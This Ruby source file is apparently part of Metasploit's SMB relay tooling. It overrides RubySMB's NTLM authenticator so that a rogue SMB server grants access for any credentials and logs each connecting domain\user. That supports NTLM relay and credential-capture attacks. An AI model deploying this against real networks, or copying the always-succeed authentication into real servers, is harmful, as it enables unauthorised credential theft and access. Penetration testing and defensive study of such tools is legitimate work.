module Msf::Exploit::Remote::SMB::Relay::Provider
  # An override for the default RubySMB NTLM Authenticator to always grant access,
  # regardless of the provided credentials
  class AlwaysGrantAccessAuthenticator < ::RubySMB::Gss::Provider::NTLM::Authenticator
    def process_ntlm_type3(type3_msg)
      dbg_string = "#{type3_msg.domain.encode(''.encoding)}\\#{type3_msg.user.encode(''.encoding)}"
      logger.info("NTLM authentication request overridden to succeed for #{dbg_string}")

      # Override the ntlm type3 validation as the current implementation of the
      # parent class validates user accounts, and doesn't support logging in without valid creds
      ::WindowsError::NTStatus::STATUS_SUCCESS
    end

    # take the GSS blob, extract the NTLM type 3 message and pass it to the process method to build the response
    # which is then put back into a new GSS reply-blob
    def process_gss_type3(gss_api)
      parent_result = super

      neg_token_init = Hash[::RubySMB::Gss.asn1dig(gss_api, 0).value.map { |obj| [obj.tag, obj.value[0].value] }]
      raw_type3_msg = neg_token_init[2]

      type3_msg = Net::NTLM::Message.parse(raw_type3_msg)
      if type3_msg.flag & ::RubySMB::Gss::Provider::NTLM::NEGOTIATE_FLAGS[:UNICODE] == ::RubySMB::Gss::Provider::NTLM::NEGOTIATE_FLAGS[:UNICODE]
        type3_msg.domain.force_encoding('UTF-16LE')
        type3_msg.user.force_encoding('UTF-16LE')
        type3_msg.workstation.force_encoding('UTF-16LE')
        identity = "#{type3_msg.domain.encode(''.encoding)}\\#{type3_msg.user.encode(''.encoding)}"
      else
        identity = nil
      end

      ::RubySMB::Gss::Provider::Result.new(
        parent_result.buffer,
        parent_result.nt_status,
        # Note: The identity is overridden from the parent implementation
        # as the parent class will not @account configuration for arbitrary users. It will now be set as domain\user
        identity
      )
    end
  end

  #
  # An override for the default RubySMB NTLM Provider to always grant access,
  # regardless of the provided credentials
  class AlwaysGrantAccess < ::RubySMB::Gss::Provider::NTLM
    def new_authenticator(server_client)
      AlwaysGrantAccessAuthenticator.new(self, server_client)
    end
  end
end
